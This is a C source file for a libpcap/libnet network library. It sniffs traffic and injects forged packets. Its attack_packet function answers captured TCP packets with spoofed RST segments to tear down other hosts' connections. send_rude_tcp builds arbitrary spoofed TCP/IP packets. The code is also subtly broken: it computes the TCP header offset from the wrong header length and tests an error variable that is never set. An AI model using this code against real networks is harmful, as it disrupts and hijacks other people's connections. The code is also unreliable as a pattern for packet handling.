#include "netlib.h"
#include "sniffer.h"

#include <stdio.h>
#include <stdlib.h>

#include <signal.h>
#include <string.h>
#include <pcap.h>
#include <stdbool.h>
#include <libnet.h>



/* Since the filter is not passed as a const char*, 
 * please store the string for the filter in a buffer first
 * before sending it in to this function, or else there
 * will be errors...
 */
pcap_t* open_pcap_socket_filtered(char* netdevice, char* filter) {
	char ebuf[PCAP_ERRBUF_SIZE];
	pcap_t* pd; 
	struct bpf_program fp;             /* compiled filter */
	
	// if netdevice is empty then we will find one...
	if (strcmp(netdevice, "") == 0) {
		netdevice = pcap_lookupdev(ebuf);
	}
		
	pd = pcap_open_live(netdevice, MAX_IP_PKT_SIZE, 1, 0, ebuf);
	if (pd == NULL) {
		printf("Error opening pcap socket: %s\n", ebuf);
		return NULL;
	}
	if (pcap_compile(pd, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) != 0) {
		printf("Couldn't compile filter %s: %s\n",
			filter,
			pcap_geterr(pd)
		);
		return NULL;
	}
	if (pcap_setfilter(pd, &fp) != 0) {
		printf("Couldn't apply filter %s, %s\n",
			filter,
			pcap_geterr(pd)
		);
		return NULL;
	}
	return pd; 
}


pcap_t* open_pcap_socket(char* netdevice) {
	pcap_t* pd;
	char filterbuf[] = "";
	pd = open_pcap_socket_filtered(netdevice, filterbuf); 
	return pd; 
}


libnet_t* open_libnet_handler(char* device) {
	libnet_t* t;
	char errbuf[LIBNET_ERRBUF_SIZE];
	t = libnet_init(LIBNET_RAW4_ADV, device, errbuf);	
	if (t == NULL) {
		printf("libnet_init() failed: %s\n", errbuf);
		return NULL;
	}
	return t;
}



void calculate_packet_sizes(const u_char *packet, struct packet_info* info) {

	struct ip_hdr* ipheader;
	struct tcp_hdr* tcpheader;

	ipheader = (struct ip_hdr*) (packet + LIBNET_ETH_H);
	tcpheader = (struct tcp_hdr*) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	short int *lengthptr = (short int*) (packet + LIBNET_ETH_H + 2);
	short int total_length = LIBNET_ETH_H + ntohs(*lengthptr);
	short int tcp_header_length = (tcpheader->tcp_off) * 4;
	int core_header_length = LIBNET_ETH_H + LIBNET_TCP_H + tcp_header_length;
	int app_length = total_length - core_header_length;

	info->total_len = total_length;
	info->tcp_header_len = tcp_header_length;
	info->app_header_len = app_length;
}


void attack_packet(libnet_t* l, struct pcap_pkthdr* cap_header, const u_char* packet) {
	
	struct packet_info packetinfo;
	calculate_packet_sizes(packet, &packetinfo);
	const u_char *app_begin = packet + LIBNET_ETH_H + LIBNET_TCP_H + packetinfo.tcp_header_len;

	// packetinfo.app_header_len will be ack increment
	libnet_ptag_t t;
	struct ip_hdr* ipheader;
	struct tcp_hdr* tcpheader;
	ipheader = (struct ip_hdr*) (packet + LIBNET_ETH_H);
	tcpheader = (struct tcp_hdr*) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

	/* Build TCP header */
	libnet_build_tcp(
		ntohs(tcpheader->tcp_dst_port),
		ntohs(tcpheader->tcp_src_port),
		ntohl(tcpheader->tcp_ack),
		ntohl(tcpheader->tcp_seq) + packetinfo.app_header_len,
		TCP_RST,
		4024,
		0,
		0,
		0,
		NULL,
		0,
		l,
		0
	);

	if (t == -1) {
		printf("Failed to build TCP header: %s\n",
			libnet_geterror(l)
		);
		exit(1);
	}

	libnet_build_ipv4(
		LIBNET_TCP_H,
		IPTOS_LOWDELAY,
		libnet_get_prand(LIBNET_PRu16),
		0,
		128,
		IP_TCP,
		0,
		*((u_long*) &(ipheader->ip_dst_addr)),
		*((u_long*) &(ipheader->ip_src_addr)),
		NULL,
		0,
		l,
		0
	);

	if (t == -1) {
		printf("Failed to build IP header: %s \n",
			libnet_geterror(l)
		);
		exit(1);
	}

	if (libnet_write(l) == -1) {
		printf("Failed to write packet: %s\n",
			libnet_geterror(l)
		);
		exit(1);
	}
	libnet_clear_packet(l);
}


void send_rude_tcp(libnet_t* l, u_long srcip, u_long dstip, uint16_t srcport, uint16_t dstport, u_char flags, uint32_t seq, uint32_t ack, u_char* data, int datalength) {

	libnet_ptag_t t;

	libnet_build_tcp(
		srcport,
		dstport,
		seq,
		ack,
		flags,
		50000,
		0,
		0,
		0,
		(uint8_t *) data,
		datalength,
		l,
		0
	);

	if (t == -1) {
		printf("Problem creating TCP layer: %s\n",
			libnet_geterror(l)
		);
		exit(1);
	}

	libnet_build_ipv4(
		LIBNET_TCP_H,
		IPTOS_LOWDELAY,
		libnet_get_prand(LIBNET_PRu16),
		0,
		255,
		IPPROTO_TCP,
		0,
		srcip,
		dstip,
		NULL,
		0,
		l,
		0
	);

	if (t == -1) {
		printf("Problem creating IP layer: %s\n",
			libnet_geterror(l)
		);
		exit(1);
	}

	if (libnet_write(l) == -1) {
		printf("Problem writing packet: %s\n",
			libnet_geterror(l)
		);
		exit(1);
	}
	libnet_clear_packet(l);
}

